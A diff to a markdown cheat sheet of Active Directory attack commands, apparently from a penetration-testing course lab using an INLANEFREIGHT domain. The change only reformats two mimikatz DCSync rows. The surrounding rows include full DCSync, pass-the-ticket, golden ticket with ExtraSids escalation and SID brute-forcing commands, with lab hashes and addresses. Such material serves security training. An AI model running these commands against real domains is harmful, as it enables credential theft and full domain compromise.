@@ -276,8 +276,7 @@
 | `python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$` | Used to submit TGS requests using `getnthash.py` from a Linux-based host. |
 | `secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba` | Impacket tool used to extract hashes from `NTDS.dit` using a `DCSync attack` and a captured hash (`-hashes`). Performed from a Linux-based host. |
 | `.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /<base64 certificate>=/ptt` | Uses Rubeus to request a TGT and perform a `pass-the-ticket attack` using the machine account (`/user:ACADEMY-EA-DC01$`) of a Windows target. Performed from a Windows-based host. |
-| ```mimikatz 
-lsadump::dcsync /user:inlanefreight\krbtgt```      | Performs a DCSync attack using `Mimikatz`. Performed from a Windows-based host. |
+| `mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt`  | Performs a DCSync attack using `Mimikatz`. Performed from a Windows-based host. |
 
 
 
@@ -338,8 +337,7 @@ lsadump::dcsync /user:inlanefreight\krbtgt```      | Performs a DCSync attack us
 | `mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt` | Uses `Mimikatz` to create a `Golden Ticket` from a Windows-based host. Creating a Golden Ticket with Mimikatz. |
 | `klist` | Confirming a Kerberos Ticket is in Memory Using klist. |
 | `.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt` | ExtraSids Attack - Rubeus. First, we need to obtain the NT hash for the KRBTGT account, which is a service account for the Key Distribution Center (KDC) in Active Directory. Second, we can use Get-DomainGroup from PowerView to obtain the SID for the Enterprise Admins group in the parent domain.The account KRB (Kerberos) TGT (Ticket Granting Ticket) is used to encrypt/sign all Kerberos tickets granted within a given domain. Uses `Rubeus` to create a `Golden Ticket` from a Windows-based host. Creating a Golden Ticket using Rubeus. |
-| ```mimikatz 
-lsadump::dcsync /user:INLANEFREIGHT\lab_adm``` | Uses `Mimikatz` to perform a DCSync attack from a Windows-based host. |
+| `mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm` | Uses `Mimikatz` to perform a DCSync attack from a Windows-based host. |
 | `secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt` | Impacket tool used to perform a DCSync attack from a Linux-based host. |
 | `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 ` | Impacket tool used to perform a `SID Brute forcing` attack from a Linux-based host. |
 | `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 \| grep "Domain SID"` | Impacket tool used to retrieve the SID of a target Windows domain from a Linux-based host. |
